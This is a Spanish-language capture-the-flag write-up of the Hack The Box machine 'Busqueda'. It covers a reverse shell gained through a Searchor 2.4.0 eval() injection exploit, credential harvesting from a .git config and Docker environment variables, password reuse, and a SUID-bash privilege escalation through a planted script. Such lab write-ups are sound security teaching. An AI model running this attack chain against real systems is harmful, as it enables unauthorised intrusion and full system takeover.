---
layout: single
title: Busqueda - Hack The Box
excerpt: Busqueda es una máquina de dificultad fácil de Hack The Box donde se obtiene acceso inicial a través de una ejecución arbitraria de código en una aplicación web vulnerable. La escalada de privilegios se logra accediendo a Gitea, analizando el código de un script ejecutable como root y abusando de permisos para establecer la bash con SUID.
date: 2025-02-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-busqueda/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Web
  - RCE
  - SUID
---

Este artículo detalla los pasos seguidos para resolver la máquina Búsqueda de Hack The Box. Es un desafío de dificultad fácil centrado en la explotación de aplicaciones web. Se comienza accediendo a la aplicación web mediante una ejecución arbitraria de código aprovechando una vulnerabilidad en un repositorio de GitHub. A partir de ahí, se obtienen credenciales que permiten el acceso a Gitea, donde se revisa el código fuente de un script que el usuario puede ejecutar con privilegios de root. Analizando su funcionamiento, se abusa de los permisos del sistema creando un archivo malicioso que modifica los permisos de la bash y la establece como SUID. Finalmente, se ejecuta la bash con privilegios elevados, logrando así el acceso completo al sistema.

### Tools/Blogs used

<ul>
  <li><strong>Searchor 2.4.0 RCE exploit</strong>: <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection" target="_blank" rel="noopener noreferrer">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a></li>
</ul>

# Recon

El primer paso será utilizar nmap para ver los puertos abiertos de la máquina. `nmap` encuentra varios puertos TCP abiertos:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El escaneo revela varios puertos TCP abiertos, lo que nos da una primera idea de la superficie de ataque disponible. El puerto 80/tcp se encuentra abierto y expone un servidor Apache 2.4.52. El escaneo indica que el sitio web redirige a http://searcher.htb/, por lo que será necesario añadir este dominio al archivo /etc/hosts para poder acceder correctamente a la aplicación web.

```
└─$ nano /etc/hosts

10.10.11.208  searcher.htb
```

Dado que se trata de una máquina Linux y que el servicio HTTP está disponible, el siguiente paso será analizar la aplicación web en busca de vulnerabilidades que nos permitan obtener acceso inicial al sistema.

# Enumeración

En primer lugar, se realizan tareas de enumeración de directorios y subdominios, pero no se obtiene información relevante que permita avanzar por esta vía.

Al analizar manualmente la página web, se observa en la parte inferior un banner con el siguiente mensaje:

![](/assets/images/htb-writeup-busqueda/web.png)

Esto resulta especialmente interesante, ya que al investigar esta versión de Searchor se encuentra que es vulnerable a una ejecución remota de comandos (RCE). La vulnerabilidad de Searchor 2.4.0 se debe al uso inseguro de la función eval() en el backend de la aplicación. La web construye dinámicamente una cadena de código Python utilizando parámetros controlados por el usuario y la ejecuta directamente sin ningún tipo de validación. Esto permite a un atacante inyectar código Python arbitrario y lograr una ejecución remota de comandos (RCE) en el sistema.

# Explotación

Para explotar esta vulnerabilidad, se aprovecha el campo de búsqueda de la aplicación web. El parámetro introducido por el usuario se pasa directamente a eval(), por lo que es posible inyectar funciones de Python que ejecuten comandos del sistema operativo.

Se ha utilizado el exploit público disponible en GitHub ([Searchor 2.4.0 Arbitrary Command Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)), el cual automatiza la inyección de código aprovechando el uso inseguro de la función eval() en Searchor 2.4.0.

El script envía un payload malicioso a la funcionalidad de búsqueda de la aplicación web, logrando ejecutar comandos arbitrarios en el sistema objetivo con los privilegios del usuario que ejecuta la aplicación.

Antes de ejecutar el script debemos ponernos en escucha por el puerto 4444 usando netcat, para recibir la reverse shell de la máquina víctima:

```
└─$ nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```
└─$ ./exploit.sh seacrher.htb 10.10.14.13 4444
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.13:${4444}
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

```
└─$ nc -nlvp 4444
Listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.208] 54926
bash: cannot set terminal process group (1639): Inapropiate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
svc
svc@busqueda:/home/svc$ cat user.txt
2ac1b522************************
```

# Escalada de privilegios

## Enumeración

Una vez obtenido acceso al sistema, se comienza con la enumeración local. Al revisar el directorio /home, se observa que svc es el único usuario que dispone de un directorio personal.

El contenido del directorio es bastante limitado, pero el archivo .gitconfig resulta especialmente interesante:

```
svc@busqueda:~$ cat .gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

De este archivo se deduce que el usuario svc está asociado al usuario cody, lo que nos da una primera pista sobre posibles credenciales reutilizadas.

Continuando con la enumeración, se localiza el código de la aplicación web en el directorio /var/www/app:

```
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr  8 19:00 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
```

La presencia del directorio .git indica que la aplicación está siendo gestionada mediante Git, lo cual puede revelar información sensible. Al revisar el archivo de configuración del repositorio, se encuentran credenciales en texto claro:

```
svc@busqueda:/var/www/app$ cat .git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Aquí se identifica un repositorio alojado en Gitea junto con credenciales válidas para el usuario cody, lo que abre un nuevo vector de ataque.

Para poder acceder al servicio, se añade el dominio gitea.searcher.htb al archivo /etc/hosts y se procede a acceder a la plataforma Gitea utilizando las credenciales obtenidas.

```
└─$ nano /etc/hosts

10.10.11.208  searcher.htb gitea.searcher.htb
```

![](/assets/images/htb-writeup-busqueda/gitea.png)

Se trata de una instancia de Gitea, y las credenciales del usuario cody funcionan correctamente, permitiendo el acceso a la plataforma sin problemas.

Una vez dentro, se revisa el repositorio correspondiente al código de la aplicación web. Aunque el código fuente del sitio se encuentra disponible, no se identifica nada especialmente relevante o vulnerable que pueda aprovecharse en este punto.

Por lo tanto, se continúa con la enumeración en busca de otros posibles vectores que permitan avanzar en la escalada de privilegios.

### sudo

Al comprobar los privilegios de sudo, se solicita la contraseña del usuario svc:

```
svc@busqueda:~$ sudo -l
[sudo] password for svc:
```

Sabiendo que el usuario svc corresponde realmente a cody, se prueba reutilizar la contraseña obtenida previamente de Gitea, la cual resulta ser válida.

```
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

El resultado muestra que el usuario svc puede ejecutar el siguiente comando con privilegios de root:

```
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Esto indica que se permite ejecutar un script de Python como root, lo cual resulta muy prometedor para la escalada de privilegios. Sin embargo, al comprobar los permisos del archivo, se observa que svc no tiene permisos de lectura, e incluso tampoco puede ejecutarlo directamente.

```
svc@busqueda:~$ ls -l /opt/scripts/system-checkup.py 
-rwx--x--x 1 root root 1903 Jan  7 09:18 /opt/scripts/system-checkup.py
```

### system-checkup

Debido al uso del (*) al final de la línea de sudo, no es posible ejecutar el script sin pasarle argumentos.

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
```

Al proporcionar un argumento cualquiera, el script se ejecuta correctamente y muestra un mensaje de ayuda con las opciones disponibles.

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py 0xdf
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps      : List running docker containers
     docker-inspect : Inspect a certain docker container
     full-checkup   : Run a full system checkup
```

El script dispone de tres funcionalidades principales. La opción docker-ps muestra los contenedores Docker en ejecución en el sistema

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

La salida confirma que hay dos contenedores activos, uno correspondiente a Gitea y otro a MySQL.

La opción docker-inspect resulta especialmente interesante, ya que permite inspeccionar un contenedor concreto y acepta un parámetro de formato. Esta funcionalidad actúa como un wrapper del comando docker inspect, permitiendo al usuario controlar el parámetro --format.

Aprovechando esta característica, se utiliza el formato {{json .}} para mostrar toda la información del contenedor en formato JSON y facilitar su lectura mediante jq:

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{                                                         
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",                          
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],  
...[snip]...
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"                          
    ],  
...[snip]...
```

Entre la información mostrada, destaca la sección Env, donde se encuentran variables de entorno sensibles utilizadas por el contenedor de Gitea. En ellas se incluyen las credenciales de conexión a la base de datos MySQL, incluyendo la contraseña.

Dado que es habitual la reutilización de contraseñas, se prueba dicha contraseña con otros usuarios. En este caso, se intenta reutilizarla para el usuario administrador de Gitea, logrando iniciar sesión correctamente en la plataforma.

## system-checkup.py

### Acceso como Administrador a gitea

Este acceso con privilegios elevados dentro de Gitea permite revisar repositorios adicionales y configuraciones internas, lo que resulta clave para avanzar en la escalada de privilegios y, finalmente, comprometer completamente el sistema.

![](/assets/images/htb-writeup-busqueda/gitea2.png)

Una vez dentro como administrador, se observa la existencia de un único repositorio privado denominado scripts. Al acceder a dicho repositorio, se localiza el archivo system-checkup.py, el mismo script que previamente se podía ejecutar con privilegios de root mediante sudo.

Esto permite analizar directamente el código del script y entender su funcionamiento interno, lo que será clave para abusar de su lógica y lograr la escalada final de privilegios.

![](/assets/images/htb-writeup-busqueda/gitea3.png)

### Analisis de system-checkup.py

Tras acceder al repositorio privado scripts como administrador de Gitea, se puede analizar el contenido del archivo system-checkup.py. El script es relativamente sencillo y está dividido en tres secciones, las cuales se ejecutan en función del argumento proporcionado.

Las funciones docker-ps y docker-inspect utilizan una función interna llamada run_command, que hace uso de subprocess.run() de forma segura, por lo que no es posible inyectar comandos a través de estas opciones.

Sin embargo, la opción full-checkup resulta especialmente interesante:

```
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

En este caso, el script intenta ejecutar el archivo full-checkup.sh desde el directorio actual. Anteriormente esta opción fallaba porque dicho archivo no existía. No obstante, esto permite un abuso claro: si se crea un archivo full-checkup.sh en el directorio desde el cual se ejecuta el script, este se ejecutará automáticamente con privilegios de root.

### Explotación

Aprovechando este comportamiento, se crea un script malicioso que copia la bash del sistema y establece el bit SUID, permitiendo ejecutar una shell con privilegios elevados.

```
svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/hack\nchmod 4777 /tmp/hack' > full-checkup.sh
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash

cp /bin/bash /tmp/hack
chmod 4777 /tmp/hack
```

Es importante marcar el archivo como ejecutable para que pueda ser lanzado correctamente por el script.

A continuación, se ejecuta nuevamente system-checkup.py con la opción full-checkup:

```
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

Tras la ejecución, se comprueba que el archivo /tmp/hack ha sido creado, pertenece a root y tiene el bit SUID activado:

```
svc@busqueda:/tmp$ ls -l /tmp/hack 
-rwsrwxrwx 1 root root 1396520 Feb 06 19:57 /tmp/hack
```

Finalmente, se ejecuta la bash con el parámetro -p para evitar la pérdida de privilegios:

```
svc@busqueda:/tmp$ /tmp/hack -p
```

Con esto, se obtiene una shell como root, permitiendo acceder al archivo root.txt y completar el compromiso total de la máquina:

```
root@busqueda:/# cat root.txt
e7df7cd2************************
```
